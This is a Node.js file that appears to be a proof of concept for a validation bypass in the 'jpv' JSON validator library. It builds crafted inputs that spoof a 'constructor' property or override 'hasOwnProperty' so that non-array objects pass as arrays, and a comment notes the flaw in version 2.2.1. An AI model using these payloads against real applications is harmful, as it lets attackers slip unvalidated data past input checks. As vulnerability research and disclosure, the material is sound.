const express = require('express')
const jpv = require('jpv')

function checkJPVMapOrig(input)
{
	var mapPattern = 
	{
		should_be_map: new Map()
	}

	return ("Validation bypassed: " + jpv.validate(input, mapPattern));

		/*
	Debugging info
	console.log(typeof(mapPattern))
	console.log(mapPattern.constructor.name);
	console.log(input.constructor.name)
	*/
}

function checkJPVArrayOrig(input)
{
	var arrayPattern = {
		should_be_arrary: []
	};

	return ("Validation bypassed: " + jpv.validate(input, arrayPattern));
}

//called with every property and its value
function process(key,value) {
    console.log(key + " : "+value);
}

function traverse(o,func) {
    for (var i in o) {
       func.apply(this,[i,o[i]]);  
        if (o[i] !== null && typeof(o[i])=="object") {
            //going one step down in the object tree!!
            traverse(o[i],func);
        }
    }
}

function exampleJPV()
{
	/*
	const input = {
		should_be_arrary: {"a":"1", 'constructor': {'name':'Array'}}
	};


	traverse(user_input, process);
	//traverse(o, process);
	var pattern = {
		should_be_arrary: []
	};	
	return ("Validation bypassed: " + jpv.validate(user_input, pattern));
	*/

	
	const input = {
		anArray: {
		  malicious: "problematic input.", 
		  constructor: [].constructor
		}
	};

	const schema = {
	  anArray: []
	};
	

	/*
	const input= {
		key7: {"a":1},
		"hasOwnProperty": (v)=>{return false;}
	}
	
	var schema = {
		key7: []
	};
	*/


	// jpv.validate(input, schema) should return false, but, as of 2.2.1, returns true
	console.log("Validation is getting bypassed: " + jpv.validate(input, schema)); 
	return jpv.validate(input, schema);

}

function constructorOverrideUpdated(input)
{
	const schema = {
	  definitelyAnArray: []
	};

	return ("Validation bypassed: " + jpv.validate(input, schema));

}

function hasOwnPropertyOverride(input)
{
	var input= {
		key7: {"a":1},
		"hasOwnProperty": (v)=>{return false;}
	}
	var schema = {
		key7: []
	};

	console.log("Validation is getting bypassed: " + jpv.validate(input, schema)); 
	return jpv.validate(input, schema);

}

module.exports = {
   checkJPVMapOrig,
   checkJPVArrayOrig,
   constructorOverrideUpdated,
   exampleJPV
}